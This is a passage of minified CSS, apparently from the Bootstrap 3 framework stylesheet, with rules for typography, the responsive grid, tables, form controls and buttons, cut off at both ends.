#ddd;border-radius:4px;-webkit-transition:all .2s ease-in-out;-o-transition:all .2s ease-in-out;transition:all .2s ease-in-out}.img-circle{border-radius:50%}hr{margin-top:20px;margin-bottom:20px;border:0;border-top:1px solid #eee}.sr-only{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);border:0}.sr-only-focusable:active,.sr-only-focusable:focus{position:static;width:auto;height:auto;margin:0;overflow:visible;clip:auto}[role=button]{cursor:pointer}.h1,.h2,.h3,.h4,.h5,.h6,h1,h2,h3,h4,h5,h6{font-family:inherit;font-weight:500;line-height:1.1;color:inherit}.h1 .small,.h1 small,.h2 .small,.h2 small,.h3 .small,.h3 small,.h4 .small,.h4 small,.h5 .small,.h5 small,.h6 .small,.h6 small,h1 .small,h1 small,h2 .small,h2 small,h3 .small,h3 small,h4 .small,h4 small,h5 .small,h5 small,h6 .small,h6 small{font-weight:400;line-height:1;color:#777}.h1,.h2,.h3,h1,h2,h3{margin-top:20px;margin-bottom:10px}.h1 .small,.h1 small,.h2 .small,.h2 small,.h3 .small,.h3 small,h1 .small,h1 small,h2 .small,h2 small,h3 .small,h3 small{font-size:65%}.h4,.h5,.h6,h4,h5,h6{margin-top:10px;margin-bottom:10px}.h4 .small,.h4 small,.h5 .small,.h5 small,.h6 .small,.h6 small,h4 .small,h4 small,h5 .small,h5 small,h6 .small,h6 small{font-size:75%}.h1,h1{font-size:36px}.h2,h2{font-size:30px}.h3,h3{font-size:24px}.h4,h4{font-size:18px}.h5,h5{font-size:14px}.h6,h6{font-size:12px}p{margin:0 0 10px}.lead{margin-bottom:20px;font-size:16px;font-weight:300;line-height:1.4}@media (min-width:768px){.lead{font-size:21px}}.small,small{font-size:85%}.mark,mark{padding:.2em;background-color:#fcf8e3}.text-left{text-align:left}.text-right{text-align:right}.text-center{text-align:center}.text-justify{text-align:justify}.text-nowrap{white-space:nowrap}.text-lowercase{text-transform:lowercase}.text-uppercase{text-transform:uppercase}.text-capitalize{text-transform:capitalize}.text-muted{color:#777}.text-primary{color:#337ab7}a.text-primary:hover{color:#286090}.text-success{color:#3c763d}a.text-success:hover{color:#2b542c}.text-info{color:#31708f}a.text-info:hover{color:#245269}.text-warning{color:#8a6d3b}a.text-warning:hover{color:#66512c}.text-danger{color:#a94442}a.text-danger:hover{color:#843534}.bg-primary{color:#fff;background-color:#337ab7}a.bg-primary:hover{background-color:#286090}.bg-success{background-color:#dff0d8}a.bg-success:hover{background-color:#c1e2b3}.bg-info{background-color:#d9edf7}a.bg-info:hover{background-color:#afd9ee}.bg-warning{background-color:#fcf8e3}a.bg-warning:hover{background-color:#f7ecb5}.bg-danger{background-color:#f2dede}a.bg-danger:hover{background-color:#e4b9b9}.page-header{padding-bottom:9px;margin:40px 0 20px;border-bottom:1px solid #eee}ol,ul{margin-top:0;margin-bottom:10px}ol ol,ol ul,ul ol,ul ul{margin-bottom:0}.list-unstyled{padding-left:0;list-style:none}.list-inline{padding-left:0;margin-left:-5px;list-style:none}.list-inline>li{display:inline-block;padding-right:5px;padding-left:5px}dl{margin-top:0;margin-bottom:20px}dd,dt{line-height:1.42857143}dt{font-weight:700}dd{margin-left:0}@media (min-width:768px){.dl-horizontal dt{float:left;width:160px;overflow:hidden;clear:left;text-align:right;text-overflow:ellipsis;white-space:nowrap}.dl-horizontal dd{margin-left:180px}}abbr[data-original-title],abbr[title]{cursor:help;border-bottom:1px dotted #777}.initialism{font-size:90%;text-transform:uppercase}blockquote{padding:10px 20px;margin:0 0 20px;font-size:17.5px;border-left:5px solid #eee}blockquote ol:last-child,blockquote p:last-child,blockquote ul:last-child{margin-bottom:0}blockquote .small,blockquote footer,blockquote small{display:block;font-size:80%;line-height:1.42857143;color:#777}blockquote .small:before,blockquote footer:before,blockquote small:before{content:'\2014 \00A0'}.blockquote-reverse,blockquote.pull-right{padding-right:15px;padding-left:0;text-align:right;border-right:5px solid #eee;border-left:0}.blockquote-reverse .small:before,.blockquote-reverse footer:before,.blockquote-reverse small:before,blockquote.pull-right .small:before,blockquote.pull-right footer:before,blockquote.pull-right small:before{content:''}.blockquote-reverse .small:after,.blockquote-reverse footer:after,.blockquote-reverse small:after,blockquote.pull-right .small:after,blockquote.pull-right footer:after,blockquote.pull-right small:after{content:'\00A0 \2014'}address{margin-bottom:20px;font-style:normal;line-height:1.42857143}code,kbd,pre,samp{font-family:Menlo,Monaco,Consolas,"Courier New",monospace}code{padding:2px 4px;font-size:90%;color:#c7254e;background-color:#f9f2f4;border-radius:4px}kbd{padding:2px 4px;font-size:90%;color:#fff;background-color:#333;border-radius:3px;-webkit-box-shadow:inset 0 -1px 0 rgba(0,0,0,.25);box-shadow:inset 0 -1px 0 rgba(0,0,0,.25)}kbd kbd{padding:0;font-size:100%;font-weight:700;-webkit-box-shadow:none;box-shadow:none}pre{display:block;padding:9.5px;margin:0 0 10px;font-size:13px;line-height:1.42857143;color:#333;word-break:break-all;word-wrap:break-word;background-color:#f5f5f5;border:1px solid #ccc;border-radius:4px}pre code{padding:0;font-size:inherit;color:inherit;white-space:pre-wrap;background-color:transparent;border-radius:0}.pre-scrollable{max-height:340px;overflow-y:scroll}.container{padding-right:15px;padding-left:15px;margin-right:auto;margin-left:auto}@media (min-width:768px){.container{width:750px}}@media (min-width:992px){.container{width:970px}}@media (min-width:1200px){.container{width:1170px}}.container-fluid{padding-right:15px;padding-left:15px;margin-right:auto;margin-left:auto}.row{margin-right:-15px;margin-left:-15px}.col-lg-1,.col-lg-10,.col-lg-11,.col-lg-12,.col-lg-2,.col-lg-3,.col-lg-4,.col-lg-5,.col-lg-6,.col-lg-7,.col-lg-8,.col-lg-9,.col-md-1,.col-md-10,.col-md-11,.col-md-12,.col-md-2,.col-md-3,.col-md-4,.col-md-5,.col-md-6,.col-md-7,.col-md-8,.col-md-9,.col-sm-1,.col-sm-10,.col-sm-11,.col-sm-12,.col-sm-2,.col-sm-3,.col-sm-4,.col-sm-5,.col-sm-6,.col-sm-7,.col-sm-8,.col-sm-9,.col-xs-1,.col-xs-10,.col-xs-11,.col-xs-12,.col-xs-2,.col-xs-3,.col-xs-4,.col-xs-5,.col-xs-6,.col-xs-7,.col-xs-8,.col-xs-9{position:relative;min-height:1px;padding-right:15px;padding-left:15px}.col-xs-1,.col-xs-10,.col-xs-11,.col-xs-12,.col-xs-2,.col-xs-3,.col-xs-4,.col-xs-5,.col-xs-6,.col-xs-7,.col-xs-8,.col-xs-9{float:left}.col-xs-12{width:100%}.col-xs-11{width:91.66666667%}.col-xs-10{width:83.33333333%}.col-xs-9{width:75%}.col-xs-8{width:66.66666667%}.col-xs-7{width:58.33333333%}.col-xs-6{width:50%}.col-xs-5{width:41.66666667%}.col-xs-4{width:33.33333333%}.col-xs-3{width:25%}.col-xs-2{width:16.66666667%}.col-xs-1{width:8.33333333%}.col-xs-pull-12{right:100%}.col-xs-pull-11{right:91.66666667%}.col-xs-pull-10{right:83.33333333%}.col-xs-pull-9{right:75%}.col-xs-pull-8{right:66.66666667%}.col-xs-pull-7{right:58.33333333%}.col-xs-pull-6{right:50%}.col-xs-pull-5{right:41.66666667%}.col-xs-pull-4{right:33.33333333%}.col-xs-pull-3{right:25%}.col-xs-pull-2{right:16.66666667%}.col-xs-pull-1{right:8.33333333%}.col-xs-pull-0{right:auto}.col-xs-push-12{left:100%}.col-xs-push-11{left:91.66666667%}.col-xs-push-10{left:83.33333333%}.col-xs-push-9{left:75%}.col-xs-push-8{left:66.66666667%}.col-xs-push-7{left:58.33333333%}.col-xs-push-6{left:50%}.col-xs-push-5{left:41.66666667%}.col-xs-push-4{left:33.33333333%}.col-xs-push-3{left:25%}.col-xs-push-2{left:16.66666667%}.col-xs-push-1{left:8.33333333%}.col-xs-push-0{left:auto}.col-xs-offset-12{margin-left:100%}.col-xs-offset-11{margin-left:91.66666667%}.col-xs-offset-10{margin-left:83.33333333%}.col-xs-offset-9{margin-left:75%}.col-xs-offset-8{margin-left:66.66666667%}.col-xs-offset-7{margin-left:58.33333333%}.col-xs-offset-6{margin-left:50%}.col-xs-offset-5{margin-left:41.66666667%}.col-xs-offset-4{margin-left:33.33333333%}.col-xs-offset-3{margin-left:25%}.col-xs-offset-2{margin-left:16.66666667%}.col-xs-offset-1{margin-left:8.33333333%}.col-xs-offset-0{margin-left:0}@media (min-width:768px){.col-sm-1,.col-sm-10,.col-sm-11,.col-sm-12,.col-sm-2,.col-sm-3,.col-sm-4,.col-sm-5,.col-sm-6,.col-sm-7,.col-sm-8,.col-sm-9{float:left}.col-sm-12{width:100%}.col-sm-11{width:91.66666667%}.col-sm-10{width:83.33333333%}.col-sm-9{width:75%}.col-sm-8{width:66.66666667%}.col-sm-7{width:58.33333333%}.col-sm-6{width:50%}.col-sm-5{width:41.66666667%}.col-sm-4{width:33.33333333%}.col-sm-3{width:25%}.col-sm-2{width:16.66666667%}.col-sm-1{width:8.33333333%}.col-sm-pull-12{right:100%}.col-sm-pull-11{right:91.66666667%}.col-sm-pull-10{right:83.33333333%}.col-sm-pull-9{right:75%}.col-sm-pull-8{right:66.66666667%}.col-sm-pull-7{right:58.33333333%}.col-sm-pull-6{right:50%}.col-sm-pull-5{right:41.66666667%}.col-sm-pull-4{right:33.33333333%}.col-sm-pull-3{right:25%}.col-sm-pull-2{right:16.66666667%}.col-sm-pull-1{right:8.33333333%}.col-sm-pull-0{right:auto}.col-sm-push-12{left:100%}.col-sm-push-11{left:91.66666667%}.col-sm-push-10{left:83.33333333%}.col-sm-push-9{left:75%}.col-sm-push-8{left:66.66666667%}.col-sm-push-7{left:58.33333333%}.col-sm-push-6{left:50%}.col-sm-push-5{left:41.66666667%}.col-sm-push-4{left:33.33333333%}.col-sm-push-3{left:25%}.col-sm-push-2{left:16.66666667%}.col-sm-push-1{left:8.33333333%}.col-sm-push-0{left:auto}.col-sm-offset-12{margin-left:100%}.col-sm-offset-11{margin-left:91.66666667%}.col-sm-offset-10{margin-left:83.33333333%}.col-sm-offset-9{margin-left:75%}.col-sm-offset-8{margin-left:66.66666667%}.col-sm-offset-7{margin-left:58.33333333%}.col-sm-offset-6{margin-left:50%}.col-sm-offset-5{margin-left:41.66666667%}.col-sm-offset-4{margin-left:33.33333333%}.col-sm-offset-3{margin-left:25%}.col-sm-offset-2{margin-left:16.66666667%}.col-sm-offset-1{margin-left:8.33333333%}.col-sm-offset-0{margin-left:0}}@media (min-width:992px){.col-md-1,.col-md-10,.col-md-11,.col-md-12,.col-md-2,.col-md-3,.col-md-4,.col-md-5,.col-md-6,.col-md-7,.col-md-8,.col-md-9{float:left}.col-md-12{width:100%}.col-md-11{width:91.66666667%}.col-md-10{width:83.33333333%}.col-md-9{width:75%}.col-md-8{width:66.66666667%}.col-md-7{width:58.33333333%}.col-md-6{width:50%}.col-md-5{width:41.66666667%}.col-md-4{width:33.33333333%}.col-md-3{width:25%}.col-md-2{width:16.66666667%}.col-md-1{width:8.33333333%}.col-md-pull-12{right:100%}.col-md-pull-11{right:91.66666667%}.col-md-pull-10{right:83.33333333%}.col-md-pull-9{right:75%}.col-md-pull-8{right:66.66666667%}.col-md-pull-7{right:58.33333333%}.col-md-pull-6{right:50%}.col-md-pull-5{right:41.66666667%}.col-md-pull-4{right:33.33333333%}.col-md-pull-3{right:25%}.col-md-pull-2{right:16.66666667%}.col-md-pull-1{right:8.33333333%}.col-md-pull-0{right:auto}.col-md-push-12{left:100%}.col-md-push-11{left:91.66666667%}.col-md-push-10{left:83.33333333%}.col-md-push-9{left:75%}.col-md-push-8{left:66.66666667%}.col-md-push-7{left:58.33333333%}.col-md-push-6{left:50%}.col-md-push-5{left:41.66666667%}.col-md-push-4{left:33.33333333%}.col-md-push-3{left:25%}.col-md-push-2{left:16.66666667%}.col-md-push-1{left:8.33333333%}.col-md-push-0{left:auto}.col-md-offset-12{margin-left:100%}.col-md-offset-11{margin-left:91.66666667%}.col-md-offset-10{margin-left:83.33333333%}.col-md-offset-9{margin-left:75%}.col-md-offset-8{margin-left:66.66666667%}.col-md-offset-7{margin-left:58.33333333%}.col-md-offset-6{margin-left:50%}.col-md-offset-5{margin-left:41.66666667%}.col-md-offset-4{margin-left:33.33333333%}.col-md-offset-3{margin-left:25%}.col-md-offset-2{margin-left:16.66666667%}.col-md-offset-1{margin-left:8.33333333%}.col-md-offset-0{margin-left:0}}@media (min-width:1200px){.col-lg-1,.col-lg-10,.col-lg-11,.col-lg-12,.col-lg-2,.col-lg-3,.col-lg-4,.col-lg-5,.col-lg-6,.col-lg-7,.col-lg-8,.col-lg-9{float:left}.col-lg-12{width:100%}.col-lg-11{width:91.66666667%}.col-lg-10{width:83.33333333%}.col-lg-9{width:75%}.col-lg-8{width:66.66666667%}.col-lg-7{width:58.33333333%}.col-lg-6{width:50%}.col-lg-5{width:41.66666667%}.col-lg-4{width:33.33333333%}.col-lg-3{width:25%}.col-lg-2{width:16.66666667%}.col-lg-1{width:8.33333333%}.col-lg-pull-12{right:100%}.col-lg-pull-11{right:91.66666667%}.col-lg-pull-10{right:83.33333333%}.col-lg-pull-9{right:75%}.col-lg-pull-8{right:66.66666667%}.col-lg-pull-7{right:58.33333333%}.col-lg-pull-6{right:50%}.col-lg-pull-5{right:41.66666667%}.col-lg-pull-4{right:33.33333333%}.col-lg-pull-3{right:25%}.col-lg-pull-2{right:16.66666667%}.col-lg-pull-1{right:8.33333333%}.col-lg-pull-0{right:auto}.col-lg-push-12{left:100%}.col-lg-push-11{left:91.66666667%}.col-lg-push-10{left:83.33333333%}.col-lg-push-9{left:75%}.col-lg-push-8{left:66.66666667%}.col-lg-push-7{left:58.33333333%}.col-lg-push-6{left:50%}.col-lg-push-5{left:41.66666667%}.col-lg-push-4{left:33.33333333%}.col-lg-push-3{left:25%}.col-lg-push-2{left:16.66666667%}.col-lg-push-1{left:8.33333333%}.col-lg-push-0{left:auto}.col-lg-offset-12{margin-left:100%}.col-lg-offset-11{margin-left:91.66666667%}.col-lg-offset-10{margin-left:83.33333333%}.col-lg-offset-9{margin-left:75%}.col-lg-offset-8{margin-left:66.66666667%}.col-lg-offset-7{margin-left:58.33333333%}.col-lg-offset-6{margin-left:50%}.col-lg-offset-5{margin-left:41.66666667%}.col-lg-offset-4{margin-left:33.33333333%}.col-lg-offset-3{margin-left:25%}.col-lg-offset-2{margin-left:16.66666667%}.col-lg-offset-1{margin-left:8.33333333%}.col-lg-offset-0{margin-left:0}}table{background-color:transparent}caption{padding-top:8px;padding-bottom:8px;color:#777;text-align:left}th{text-align:left}.table{width:100%;max-width:100%;margin-bottom:20px}.table>tbody>tr>td,.table>tbody>tr>th,.table>tfoot>tr>td,.table>tfoot>tr>th,.table>thead>tr>td,.table>thead>tr>th{padding:8px;line-height:1.42857143;vertical-align:top;border-top:1px solid #ddd}.table>thead>tr>th{vertical-align:bottom;border-bottom:2px solid #ddd}.table>caption+thead>tr:first-child>td,.table>caption+thead>tr:first-child>th,.table>colgroup+thead>tr:first-child>td,.table>colgroup+thead>tr:first-child>th,.table>thead:first-child>tr:first-child>td,.table>thead:first-child>tr:first-child>th{border-top:0}.table>tbody+tbody{border-top:2px solid #ddd}.table .table{background-color:#fff}.table-condensed>tbody>tr>td,.table-condensed>tbody>tr>th,.table-condensed>tfoot>tr>td,.table-condensed>tfoot>tr>th,.table-condensed>thead>tr>td,.table-condensed>thead>tr>th{padding:5px}.table-bordered{border:1px solid #ddd}.table-bordered>tbody>tr>td,.table-bordered>tbody>tr>th,.table-bordered>tfoot>tr>td,.table-bordered>tfoot>tr>th,.table-bordered>thead>tr>td,.table-bordered>thead>tr>th{border:1px solid #ddd}.table-bordered>thead>tr>td,.table-bordered>thead>tr>th{border-bottom-width:2px}.table-striped>tbody>tr:nth-of-type(odd){background-color:#f9f9f9}.table-hover>tbody>tr:hover{background-color:#f5f5f5}table col[class*=col-]{position:static;display:table-column;float:none}table td[class*=col-],table th[class*=col-]{position:static;display:table-cell;float:none}.table>tbody>tr.active>td,.table>tbody>tr.active>th,.table>tbody>tr>td.active,.table>tbody>tr>th.active,.table>tfoot>tr.active>td,.table>tfoot>tr.active>th,.table>tfoot>tr>td.active,.table>tfoot>tr>th.active,.table>thead>tr.active>td,.table>thead>tr.active>th,.table>thead>tr>td.active,.table>thead>tr>th.active{background-color:#f5f5f5}.table-hover>tbody>tr.active:hover>td,.table-hover>tbody>tr.active:hover>th,.table-hover>tbody>tr:hover>.active,.table-hover>tbody>tr>td.active:hover,.table-hover>tbody>tr>th.active:hover{background-color:#e8e8e8}.table>tbody>tr.success>td,.table>tbody>tr.success>th,.table>tbody>tr>td.success,.table>tbody>tr>th.success,.table>tfoot>tr.success>td,.table>tfoot>tr.success>th,.table>tfoot>tr>td.success,.table>tfoot>tr>th.success,.table>thead>tr.success>td,.table>thead>tr.success>th,.table>thead>tr>td.success,.table>thead>tr>th.success{background-color:#dff0d8}.table-hover>tbody>tr.success:hover>td,.table-hover>tbody>tr.success:hover>th,.table-hover>tbody>tr:hover>.success,.table-hover>tbody>tr>td.success:hover,.table-hover>tbody>tr>th.success:hover{background-color:#d0e9c6}.table>tbody>tr.info>td,.table>tbody>tr.info>th,.table>tbody>tr>td.info,.table>tbody>tr>th.info,.table>tfoot>tr.info>td,.table>tfoot>tr.info>th,.table>tfoot>tr>td.info,.table>tfoot>tr>th.info,.table>thead>tr.info>td,.table>thead>tr.info>th,.table>thead>tr>td.info,.table>thead>tr>th.info{background-color:#d9edf7}.table-hover>tbody>tr.info:hover>td,.table-hover>tbody>tr.info:hover>th,.table-hover>tbody>tr:hover>.info,.table-hover>tbody>tr>td.info:hover,.table-hover>tbody>tr>th.info:hover{background-color:#c4e3f3}.table>tbody>tr.warning>td,.table>tbody>tr.warning>th,.table>tbody>tr>td.warning,.table>tbody>tr>th.warning,.table>tfoot>tr.warning>td,.table>tfoot>tr.warning>th,.table>tfoot>tr>td.warning,.table>tfoot>tr>th.warning,.table>thead>tr.warning>td,.table>thead>tr.warning>th,.table>thead>tr>td.warning,.table>thead>tr>th.warning{background-color:#fcf8e3}.table-hover>tbody>tr.warning:hover>td,.table-hover>tbody>tr.warning:hover>th,.table-hover>tbody>tr:hover>.warning,.table-hover>tbody>tr>td.warning:hover,.table-hover>tbody>tr>th.warning:hover{background-color:#faf2cc}.table>tbody>tr.danger>td,.table>tbody>tr.danger>th,.table>tbody>tr>td.danger,.table>tbody>tr>th.danger,.table>tfoot>tr.danger>td,.table>tfoot>tr.danger>th,.table>tfoot>tr>td.danger,.table>tfoot>tr>th.danger,.table>thead>tr.danger>td,.table>thead>tr.danger>th,.table>thead>tr>td.danger,.table>thead>tr>th.danger{background-color:#f2dede}.table-hover>tbody>tr.danger:hover>td,.table-hover>tbody>tr.danger:hover>th,.table-hover>tbody>tr:hover>.danger,.table-hover>tbody>tr>td.danger:hover,.table-hover>tbody>tr>th.danger:hover{background-color:#ebcccc}.table-responsive{min-height:.01%;overflow-x:auto}@media screen and (max-width:767px){.table-responsive{width:100%;margin-bottom:15px;overflow-y:hidden;-ms-overflow-style:-ms-autohiding-scrollbar;border:1px solid #ddd}.table-responsive>.table{margin-bottom:0}.table-responsive>.table>tbody>tr>td,.table-responsive>.table>tbody>tr>th,.table-responsive>.table>tfoot>tr>td,.table-responsive>.table>tfoot>tr>th,.table-responsive>.table>thead>tr>td,.table-responsive>.table>thead>tr>th{white-space:nowrap}.table-responsive>.table-bordered{border:0}.table-responsive>.table-bordered>tbody>tr>td:first-child,.table-responsive>.table-bordered>tbody>tr>th:first-child,.table-responsive>.table-bordered>tfoot>tr>td:first-child,.table-responsive>.table-bordered>tfoot>tr>th:first-child,.table-responsive>.table-bordered>thead>tr>td:first-child,.table-responsive>.table-bordered>thead>tr>th:first-child{border-left:0}.table-responsive>.table-bordered>tbody>tr>td:last-child,.table-responsive>.table-bordered>tbody>tr>th:last-child,.table-responsive>.table-bordered>tfoot>tr>td:last-child,.table-responsive>.table-bordered>tfoot>tr>th:last-child,.table-responsive>.table-bordered>thead>tr>td:last-child,.table-responsive>.table-bordered>thead>tr>th:last-child{border-right:0}.table-responsive>.table-bordered>tbody>tr:last-child>td,.table-responsive>.table-bordered>tbody>tr:last-child>th,.table-responsive>.table-bordered>tfoot>tr:last-child>td,.table-responsive>.table-bordered>tfoot>tr:last-child>th{border-bottom:0}}fieldset{min-width:0;padding:0;margin:0;border:0}legend{display:block;width:100%;padding:0;margin-bottom:20px;font-size:21px;line-height:inherit;color:#333;border:0;border-bottom:1px solid #e5e5e5}label{display:inline-block;max-width:100%;margin-bottom:5px;font-weight:700}input[type=search]{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}input[type=checkbox],input[type=radio]{margin:4px 0 0;margin-top:1px \9;line-height:normal}input[type=file]{display:block}input[type=range]{display:block;width:100%}select[multiple],select[size]{height:auto}input[type=file]:focus,input[type=checkbox]:focus,input[type=radio]:focus{outline:thin dotted;outline:5px auto -webkit-focus-ring-color;outline-offset:-2px}output{display:block;padding-top:7px;font-size:14px;line-height:1.42857143;color:#555}.form-control{display:block;width:100%;height:34px;padding:6px 12px;font-size:14px;line-height:1.42857143;color:#555;background-color:#fff;background-image:none;border:1px solid #ccc;border-radius:4px;-webkit-box-shadow:inset 0 1px 1px rgba(0,0,0,.075);box-shadow:inset 0 1px 1px rgba(0,0,0,.075);-webkit-transition:border-color ease-in-out .15s,-webkit-box-shadow ease-in-out .15s;-o-transition:border-color ease-in-out .15s,box-shadow ease-in-out .15s;transition:border-color ease-in-out .15s,box-shadow ease-in-out .15s}.form-control:focus{border-color:#66afe9;outline:0;-webkit-box-shadow:inset 0 1px 1px rgba(0,0,0,.075),0 0 8px rgba(102,175,233,.6);box-shadow:inset 0 1px 1px rgba(0,0,0,.075),0 0 8px rgba(102,175,233,.6)}.form-control::-moz-placeholder{color:#999;opacity:1}.form-control:-ms-input-placeholder{color:#999}.form-control::-webkit-input-placeholder{color:#999}.form-control[disabled],.form-control[readonly],fieldset[disabled] .form-control{background-color:#eee;opacity:1}.form-control[disabled],fieldset[disabled] .form-control{cursor:not-allowed}textarea.form-control{height:auto}input[type=search]{-webkit-appearance:none}@media screen and (-webkit-min-device-pixel-ratio:0){input[type=date],input[type=time],input[type=datetime-local],input[type=month]{line-height:34px}.input-group-sm input[type=date],.input-group-sm input[type=time],.input-group-sm input[type=datetime-local],.input-group-sm input[type=month],input[type=date].input-sm,input[type=time].input-sm,input[type=datetime-local].input-sm,input[type=month].input-sm{line-height:30px}.input-group-lg input[type=date],.input-group-lg input[type=time],.input-group-lg input[type=datetime-local],.input-group-lg input[type=month],input[type=date].input-lg,input[type=time].input-lg,input[type=datetime-local].input-lg,input[type=month].input-lg{line-height:46px}}.form-group{margin-bottom:15px}.checkbox,.radio{position:relative;display:block;margin-top:10px;margin-bottom:10px}.checkbox label,.radio label{min-height:20px;padding-left:20px;margin-bottom:0;font-weight:400;cursor:pointer}.checkbox input[type=checkbox],.checkbox-inline input[type=checkbox],.radio input[type=radio],.radio-inline input[type=radio]{position:absolute;margin-top:4px \9;margin-left:-20px}.checkbox+.checkbox,.radio+.radio{margin-top:-5px}.checkbox-inline,.radio-inline{position:relative;display:inline-block;padding-left:20px;margin-bottom:0;font-weight:400;vertical-align:middle;cursor:pointer}.checkbox-inline+.checkbox-inline,.radio-inline+.radio-inline{margin-top:0;margin-left:10px}fieldset[disabled] input[type=checkbox],fieldset[disabled] input[type=radio],input[type=checkbox].disabled,input[type=checkbox][disabled],input[type=radio].disabled,input[type=radio][disabled]{cursor:not-allowed}.checkbox-inline.disabled,.radio-inline.disabled,fieldset[disabled] .checkbox-inline,fieldset[disabled] .radio-inline{cursor:not-allowed}.checkbox.disabled label,.radio.disabled label,fieldset[disabled] .checkbox label,fieldset[disabled] .radio label{cursor:not-allowed}.form-control-static{min-height:34px;padding-top:7px;padding-bottom:7px;margin-bottom:0}.form-control-static.input-lg,.form-control-static.input-sm{padding-right:0;padding-left:0}.input-sm{height:30px;padding:5px 10px;font-size:12px;line-height:1.5;border-radius:3px}select.input-sm{height:30px;line-height:30px}select[multiple].input-sm,textarea.input-sm{height:auto}.form-group-sm .form-control{height:30px;padding:5px 10px;font-size:12px;line-height:1.5;border-radius:3px}select.form-group-sm .form-control{height:30px;line-height:30px}select[multiple].form-group-sm .form-control,textarea.form-group-sm .form-control{height:auto}.form-group-sm .form-control-static{height:30px;min-height:32px;padding:5px 10px;font-size:12px;line-height:1.5}.input-lg{height:46px;padding:10px 16px;font-size:18px;line-height:1.3333333;border-radius:6px}select.input-lg{height:46px;line-height:46px}select[multiple].input-lg,textarea.input-lg{height:auto}.form-group-lg .form-control{height:46px;padding:10px 16px;font-size:18px;line-height:1.3333333;border-radius:6px}select.form-group-lg .form-control{height:46px;line-height:46px}select[multiple].form-group-lg .form-control,textarea.form-group-lg .form-control{height:auto}.form-group-lg .form-control-static{height:46px;min-height:38px;padding:10px 16px;font-size:18px;line-height:1.3333333}.has-feedback{position:relative}.has-feedback .form-control{padding-right:42.5px}.form-control-feedback{position:absolute;top:0;right:0;z-index:2;display:block;width:34px;height:34px;line-height:34px;text-align:center;pointer-events:none}.input-lg+.form-control-feedback{width:46px;height:46px;line-height:46px}.input-sm+.form-control-feedback{width:30px;height:30px;line-height:30px}.has-success .checkbox,.has-success .checkbox-inline,.has-success .control-label,.has-success .help-block,.has-success .radio,.has-success .radio-inline,.has-success.checkbox label,.has-success.checkbox-inline label,.has-success.radio label,.has-success.radio-inline label{color:#3c763d}.has-success .form-control{border-color:#3c763d;-webkit-box-shadow:inset 0 1px 1px rgba(0,0,0,.075);box-shadow:inset 0 1px 1px rgba(0,0,0,.075)}.has-success .form-control:focus{border-color:#2b542c;-webkit-box-shadow:inset 0 1px 1px rgba(0,0,0,.075),0 0 6px #67b168;box-shadow:inset 0 1px 1px rgba(0,0,0,.075),0 0 6px #67b168}.has-success .input-group-addon{color:#3c763d;background-color:#dff0d8;border-color:#3c763d}.has-success .form-control-feedback{color:#3c763d}.has-warning .checkbox,.has-warning .checkbox-inline,.has-warning .control-label,.has-warning .help-block,.has-warning .radio,.has-warning .radio-inline,.has-warning.checkbox label,.has-warning.checkbox-inline label,.has-warning.radio label,.has-warning.radio-inline label{color:#8a6d3b}.has-warning .form-control{border-color:#8a6d3b;-webkit-box-shadow:inset 0 1px 1px rgba(0,0,0,.075);box-shadow:inset 0 1px 1px rgba(0,0,0,.075)}.has-warning .form-control:focus{border-color:#66512c;-webkit-box-shadow:inset 0 1px 1px rgba(0,0,0,.075),0 0 6px #c0a16b;box-shadow:inset 0 1px 1px rgba(0,0,0,.075),0 0 6px #c0a16b}.has-warning .input-group-addon{color:#8a6d3b;background-color:#fcf8e3;border-color:#8a6d3b}.has-warning .form-control-feedback{color:#8a6d3b}.has-error .checkbox,.has-error .checkbox-inline,.has-error .control-label,.has-error .help-block,.has-error .radio,.has-error .radio-inline,.has-error.checkbox label,.has-error.checkbox-inline label,.has-error.radio label,.has-error.radio-inline label{color:#a94442}.has-error .form-control{border-color:#a94442;-webkit-box-shadow:inset 0 1px 1px rgba(0,0,0,.075);box-shadow:inset 0 1px 1px rgba(0,0,0,.075)}.has-error .form-control:focus{border-color:#843534;-webkit-box-shadow:inset 0 1px 1px rgba(0,0,0,.075),0 0 6px #ce8483;box-shadow:inset 0 1px 1px rgba(0,0,0,.075),0 0 6px #ce8483}.has-error .input-group-addon{color:#a94442;background-color:#f2dede;border-color:#a94442}.has-error .form-control-feedback{color:#a94442}.has-feedback label~.form-control-feedback{top:25px}.has-feedback label.sr-only~.form-control-feedback{top:0}.help-block{display:block;margin-top:5px;margin-bottom:10px;color:#737373}@media (min-width:768px){.form-inline .form-group{display:inline-block;margin-bottom:0;vertical-align:middle}.form-inline .form-control{display:inline-block;width:auto;vertical-align:middle}.form-inline .form-control-static{display:inline-block}.form-inline .input-group{display:inline-table;vertical-align:middle}.form-inline .input-group .form-control,.form-inline .input-group .input-group-addon,.form-inline .input-group .input-group-btn{width:auto}.form-inline .input-group>.form-control{width:100%}.form-inline .control-label{margin-bottom:0;vertical-align:middle}.form-inline .checkbox,.form-inline .radio{display:inline-block;margin-top:0;margin-bottom:0;vertical-align:middle}.form-inline .checkbox label,.form-inline .radio label{padding-left:0}.form-inline .checkbox input[type=checkbox],.form-inline .radio input[type=radio]{position:relative;margin-left:0}.form-inline .has-feedback .form-control-feedback{top:0}}.form-horizontal .checkbox,.form-horizontal .checkbox-inline,.form-horizontal .radio,.form-horizontal .radio-inline{padding-top:7px;margin-top:0;margin-bottom:0}.form-horizontal .checkbox,.form-horizontal .radio{min-height:27px}.form-horizontal .form-group{margin-right:-15px;margin-left:-15px}@media (min-width:768px){.form-horizontal .control-label{padding-top:7px;margin-bottom:0;text-align:right}}.form-horizontal .has-feedback .form-control-feedback{right:15px}@media (min-width:768px){.form-horizontal .form-group-lg .control-label{padding-top:14.33px}}@media (min-width:768px){.form-horizontal .form-group-sm .control-label{padding-top:6px}}.btn{display:inline-block;padding:6px 12px;margin-bottom:0;font-size:14px;font-weight:400;line-height:1.42857143;text-align:center;white-space:nowrap;vertical-align:middle;-ms-touch-action:manipulation;touch-action:manipulation;cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;background-image:none;border:1px solid transparent;border-radius:4px}.btn.active.focus,.btn.active:focus,.btn.focus,.btn:active.focus,.btn:active:focus,.btn:focus{outline:thin dotted;outline:5px auto -webkit-focus-ring-color;outline-offset:-2px}.btn.focus,.btn:focus,.btn:hover{color:#333;text-decoration:none}.btn.active,.btn:active{background-image:none;outline:0;-webkit-box-shadow:inset 0 3px 5px rgba(0,0,0,.125);box-shadow:inset 0 3px 5px 